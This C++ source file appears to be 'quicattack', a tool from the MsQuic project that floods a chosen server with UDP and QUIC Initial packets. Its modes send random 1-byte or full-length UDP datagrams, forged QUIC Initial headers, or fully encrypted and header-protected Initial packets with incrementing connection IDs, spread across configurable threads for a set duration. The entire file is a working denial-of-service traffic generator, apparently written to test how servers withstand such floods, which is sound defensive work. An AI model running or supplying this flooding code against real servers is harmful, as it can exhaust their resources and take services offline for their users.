/*++

    Copyright (c) Microsoft Corporation.
    Licensed under the MIT License.

--*/

#pragma warning(disable:4200)  // nonstandard extension used: bit field types other than int
#pragma warning(disable:4201)  // nonstandard extension used: nameless struct/union
#pragma warning(disable:4204)  // nonstandard extension used: non-constant aggregate initializer
#pragma warning(disable:4214)  // nonstandard extension used: zero-sized array in struct/union
#pragma warning(disable:28931) // Unused Assignment

#include <precomp.h> // from 'core' dir
#include <msquichelper.h>

#include "packet_writer.h"

#define US_TO_MS(x) ((x) / 1000)

#define QUIC_MIN_INITIAL_LENGTH 1200

#define ATTACK_TIMEOUT_DEFAULT_MS (60 * 1000)

#define ATTACK_THREADS_DEFAULT 1

#define ATTACK_PORT_DEFAULT 443

void
PrintUsage()
{
    printf("quicattack is used for generating attack traffic towards a designated server.\n\n");

    printf("Usage:\n");
    printf("  quicattack.exe -list\n\n");
    printf("  quicattack.exe -type:<number> -ip:<ip_address_and_port> [-alpn:<protocol_name>] [-sni:<host_name>] [-timeout:<ms>] [-threads:<count>]\n\n");
}

void
PrintUsageList()
{
    printf("The following are the different types of attacks supported by the tool.\n\n");

    printf("#1 - Random UDP 1 byte UDP packets.\n");
    printf("#2 - Random UDP full length UDP packets.\n");
    printf("#3 - Random QUIC Initial packets.\n");
    printf("#4 - Valid QUIC initial packets.\n");
}

struct StrBuffer
{
    uint8_t* Data;
    uint16_t Length;

    StrBuffer(const char* HexBytes)
    {
        Length = (uint16_t)(strlen(HexBytes) / 2);
        Data = new uint8_t[Length];

        for (uint16_t i = 0; i < Length; ++i) {
            Data[i] =
                (DecodeHexChar(HexBytes[i * 2]) << 4) |
                DecodeHexChar(HexBytes[i * 2 + 1]);
        }
    }

    ~StrBuffer() { delete [] Data; }
};

_IRQL_requires_max_(DISPATCH_LEVEL)
_Function_class_(QUIC_DATAPATH_RECEIVE_CALLBACK)
void
UdpRecvCallback(
    _In_ QUIC_DATAPATH_BINDING* /* Binding */,
    _In_ void* /* Context */,
    _In_ QUIC_RECV_DATAGRAM* RecvBufferChain
    )
{
    QuicDataPathBindingReturnRecvDatagrams(RecvBufferChain);
}

_IRQL_requires_max_(DISPATCH_LEVEL)
_Function_class_(QUIC_DATAPATH_UNREACHABLE_CALLBACK)
void
UdpUnreachCallback(
    _In_ QUIC_DATAPATH_BINDING* /* Binding */,
    _In_ void* /* Context */,
    _In_ const QUIC_ADDR* /* RemoteAddress */
    )
{
}

void
RunAttackRandom(
    QUIC_DATAPATH_BINDING* Binding,
    const QUIC_ADDR* ServerAddress,
    uint16_t Length,
    bool ValidQuic,
    uint64_t TimeoutMs
    )
{
    uint64_t ConnectionId = 0;
    QuicRandom(sizeof(ConnectionId), (uint8_t*)&ConnectionId);

    uint64_t PacketCount = 0;
    uint64_t TimeStart = QuicTimeMs64();
    while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs) {

        QUIC_DATAPATH_SEND_CONTEXT* SendContext =
            QuicDataPathBindingAllocSendContext(Binding, Length);
        if (SendContext == nullptr) {
            printf("QuicDataPathBindingAllocSendContext failed\n");
            return;
        }

        while (!QuicDataPathBindingIsSendContextFull(SendContext)) {
            QUIC_BUFFER* SendBuffer =
                QuicDataPathBindingAllocSendDatagram(SendContext, Length);
            if (SendBuffer == nullptr) {
                printf("QuicDataPathBindingAllocSendDatagram failed\n");
                QuicDataPathBindingFreeSendContext(SendContext);
                return;
            }

            QuicRandom(Length, SendBuffer->Buffer);

            if (ValidQuic) {
                QUIC_LONG_HEADER_V1* Header =
                    (QUIC_LONG_HEADER_V1*)SendBuffer->Buffer;
                Header->IsLongHeader = 1;
                Header->Type = QUIC_INITIAL;
                Header->FixedBit = 1;
                Header->Reserved = 0;
                Header->Version = QUIC_VERSION_LATEST;
                Header->DestCIDLength = 8;
                ConnectionId++;
                QuicCopyMemory(Header->DestCID, &ConnectionId, sizeof(ConnectionId));
                Header->DestCID[8] = 8;
                Header->DestCID[17] = 0;
                QuicVarIntEncode(
                    Length - (MIN_LONG_HEADER_LENGTH_V1 + 19),
                    Header->DestCID + 18);
            }

            ++PacketCount;
        }

        QUIC_STATUS Status =
            QuicDataPathBindingSendTo(
                Binding,
                ServerAddress,
                SendContext);
        if (QUIC_FAILED(Status)) {
            printf("QuicDataPathBindingSendTo failed, 0x%x\n", Status);
            return;
        }
    }

    uint64_t TimeEnd = QuicTimeMs64();
    printf("%llu packets were sent (%llu Hz).\n",
        PacketCount, (PacketCount * 1000) / QuicTimeDiff64(TimeStart, TimeEnd));
}

#if DBG
void printf_buf(const char* name, void* buf, uint32_t len)
{
    printf("%s: ", name);
    for (uint32_t i = 0; i < len; i++) {
        printf("%.2X", ((uint8_t*)buf)[i]);
    }
    printf("\n");
}
#else
#define printf_buf(name, buf, len)
#endif

void
RunAttackValidInitial(
    QUIC_DATAPATH_BINDING* Binding,
    const QUIC_ADDR* ServerAddress,
    _In_z_ const char* Alpn,
    _In_opt_z_ const char* ServerName,
    uint64_t TimeoutMs
    )
{
    const StrBuffer InitialSalt("7fbcdb0e7c66bbe9193a96cd21519ebd7a02644a");
    const uint16_t DatagramLength = 1200;
    const uint64_t PacketNumber = 0;

    uint8_t Packet[256] = {0};
    uint16_t PacketLength, HeaderLength;
    PacketWriter::WriteClientInitialPacket(
        PacketNumber,
        sizeof(uint64_t),
        Alpn,
        ServerName,
        sizeof(Packet),
        Packet,
        &PacketLength,
        &HeaderLength);
    uint16_t PacketNumberOffset = HeaderLength - sizeof(uint32_t);

    uint64_t* DestCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1));
    uint64_t* SrcCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1) + sizeof(uint64_t) + sizeof(uint8_t));

    QuicRandom(sizeof(uint64_t), (uint8_t*)DestCid);
    QuicRandom(sizeof(uint64_t), (uint8_t*)SrcCid);

    uint64_t PacketCount = 0;
    uint64_t TimeStart = QuicTimeMs64();
    while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs) {

        QUIC_DATAPATH_SEND_CONTEXT* SendContext =
            QuicDataPathBindingAllocSendContext(Binding, DatagramLength);
        VERIFY(SendContext);

        while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs &&
            !QuicDataPathBindingIsSendContextFull(SendContext)) {
            QUIC_BUFFER* SendBuffer =
                QuicDataPathBindingAllocSendDatagram(SendContext, DatagramLength);
            VERIFY(SendBuffer);

            (*DestCid)++; (*SrcCid)++;
            memcpy(SendBuffer->Buffer, Packet, PacketLength);

            printf_buf("cleartext", SendBuffer->Buffer, PacketLength - QUIC_ENCRYPTION_OVERHEAD);

            QUIC_PACKET_KEY* WriteKey;
            VERIFY(
            QUIC_SUCCEEDED(
            QuicPacketKeyCreateInitial(
                FALSE,
                InitialSalt.Data,
                sizeof(uint64_t),
                (uint8_t*)DestCid,
                nullptr,
                &WriteKey)));

            printf_buf("salt", InitialSalt.Data, InitialSalt.Length);
            printf_buf("cid", DestCid, sizeof(uint64_t));

            uint8_t Iv[QUIC_IV_LENGTH];
            QuicCryptoCombineIvAndPacketNumber(
                WriteKey->Iv, (uint8_t*)&PacketNumber, Iv);

            QuicEncrypt(
                WriteKey->PacketKey,
                Iv,
                HeaderLength,
                SendBuffer->Buffer,
                PacketLength - HeaderLength,
                SendBuffer->Buffer + HeaderLength);

            printf_buf("encrypted", SendBuffer->Buffer, PacketLength);

            uint8_t HpMask[16];
            QuicHpComputeMask(
                WriteKey->HeaderKey,
                1,
                SendBuffer->Buffer + HeaderLength,
                HpMask);

            printf_buf("cipher_text", SendBuffer->Buffer + HeaderLength, 16);
            printf_buf("hp_mask", HpMask, 16);

            QuicPacketKeyFree(WriteKey);

            SendBuffer->Buffer[0] ^= HpMask[0] & 0x0F;
            for (uint8_t i = 0; i < 4; ++i) {
                SendBuffer->Buffer[PacketNumberOffset + i] ^= HpMask[i + 1];
            }

            printf_buf("protected", SendBuffer->Buffer, PacketLength);

            ++PacketCount;
        }

        VERIFY(
        QUIC_SUCCEEDED(
        QuicDataPathBindingSendTo(
            Binding,
            ServerAddress,
            SendContext)));
    }

    uint64_t TimeEnd = QuicTimeMs64();
    printf("%llu packets were sent (%llu Hz).\n",
        PacketCount, (PacketCount * 1000) / QuicTimeDiff64(TimeStart, TimeEnd));
}

struct ATTACK_THREAD_CONTEXT {
    QUIC_DATAPATH_BINDING* Binding;
    uint32_t Type;
    const QUIC_ADDR* ServerAddress;
    const char* Alpn;
    const char* ServerName;
    uint64_t TimeoutMs;
};

QUIC_THREAD_CALLBACK(RunAttackThread, _Context)
{
    const ATTACK_THREAD_CONTEXT* Context = (ATTACK_THREAD_CONTEXT*)_Context;
    switch (Context->Type) {
    case 1:
        RunAttackRandom(Context->Binding, Context->ServerAddress, 1, false, Context->TimeoutMs);
        break;
    case 2:
        RunAttackRandom(Context->Binding, Context->ServerAddress, QUIC_MIN_INITIAL_LENGTH, false, Context->TimeoutMs);
        break;
    case 3:
        RunAttackRandom(Context->Binding, Context->ServerAddress, QUIC_MIN_INITIAL_LENGTH, true, Context->TimeoutMs);
        break;
    case 4:
        RunAttackValidInitial(Context->Binding, Context->ServerAddress, Context->Alpn, Context->ServerName, Context->TimeoutMs);
        break;
    default:
        break;
    }
    QUIC_THREAD_RETURN(QUIC_STATUS_SUCCESS);
}

void
RunAttack(
    uint32_t ThreadCount,
    uint32_t Type,
    const QUIC_ADDR* ServerAddress,
    _In_z_ const char* Alpn,
    _In_opt_z_ const char* ServerName,
    uint64_t TimeoutMs
    )
{
    QUIC_STATUS Status;
    QUIC_DATAPATH* Datapath = nullptr;
    QUIC_DATAPATH_BINDING* Binding = nullptr;

    Status =
        QuicDataPathInitialize(
            0,
            UdpRecvCallback,
            UdpUnreachCallback,
            &Datapath);
    if (QUIC_FAILED(Status)) {
        printf("QuicDataPathInitialize failed, 0x%x\n", Status);
        goto Error;
    }

    Status =
        QuicDataPathBindingCreate(
            Datapath,
            nullptr,
            ServerAddress,
            nullptr,
            &Binding);
    if (QUIC_FAILED(Status)) {
        printf("QuicDataPathBindingCreate failed, 0x%x\n", Status);
        goto Error;
    }

    {
        ATTACK_THREAD_CONTEXT ThreadContext = {
            Binding, Type, ServerAddress, Alpn, ServerName, TimeoutMs
        };
        QUIC_THREAD** Threads =
            (QUIC_THREAD**)QUIC_ALLOC_PAGED(ThreadCount * sizeof(QUIC_THREAD*));
        for (uint32_t i = 0; i < ThreadCount; ++i) {
            QUIC_THREAD_CONFIG ThreadConfig = {
                0, 0, "AttackRunner", RunAttackThread, &ThreadContext
            };
            QuicThreadCreate(&ThreadConfig, &Threads[i]);
        }
        for (uint32_t i = 0; i < ThreadCount; ++i) {
            QuicThreadWait(Threads[i]);
            QuicThreadDelete(Threads[i]);
        }
    }

Error:

    if (Binding != nullptr) {
        QuicDataPathBindingDelete(Binding);
    }

    if (Datapath != nullptr) {
        QuicDataPathUninitialize(Datapath);
    }
}

int
QUIC_MAIN_EXPORT
main(
    _In_ int argc,
    _In_reads_(argc) _Null_terminated_ char* argv[]
    )
{
    int ErrorCode = -1;

    QuicPlatformSystemLoad();
    QuicPlatformInitialize();

    if (argc < 2) {
        PrintUsage();
        goto Error;
    }

    if (strcmp("-list", argv[1]) == 0) {
        PrintUsageList();
        ErrorCode = 0;

    } else {
        uint32_t Type;
        const char* IpAddress;
        if (!TryGetValue(argc, argv, "type", &Type) ||
            !TryGetValue(argc, argv, "ip", &IpAddress)) {
            PrintUsage();
            goto Error;
        }

        if (Type < 1 || Type > 4) {
            printf("Invalid -type:'%d' specified!\n", Type);
            goto Error;
        }

        const char* Alpn = "h3-24";
        (void)TryGetValue(argc, argv, "alpn", &Alpn);

        const char* ServerName = nullptr;
        (void)TryGetValue(argc, argv, "sni", &ServerName);

        uint64_t TimeoutMs = ATTACK_TIMEOUT_DEFAULT_MS;
        (void)TryGetValue(argc, argv, "timeout", &TimeoutMs);

        uint32_t ThreadCount = ATTACK_THREADS_DEFAULT;
        (void)TryGetValue(argc, argv, "threads", &ThreadCount);

        QUIC_ADDR TargetAddress = {0};
        if (!ConvertArgToAddress(IpAddress, ATTACK_PORT_DEFAULT, &TargetAddress)) {
            printf("Invalid -ip:'%s' specified! Must be IPv4 or IPv6 address and port.\n", IpAddress);
            goto Error;
        }

        if (TargetAddress.Ipv4.sin_port == 0) {
            printf("A UDP port must be specified with the IP address.\n");
            goto Error;
        }

        RunAttack(ThreadCount, Type, &TargetAddress, Alpn, ServerName, TimeoutMs);
        ErrorCode = 0;
    }

Error:

    QuicPlatformUninitialize();
    QuicPlatformSystemUnload();

    return ErrorCode;
}
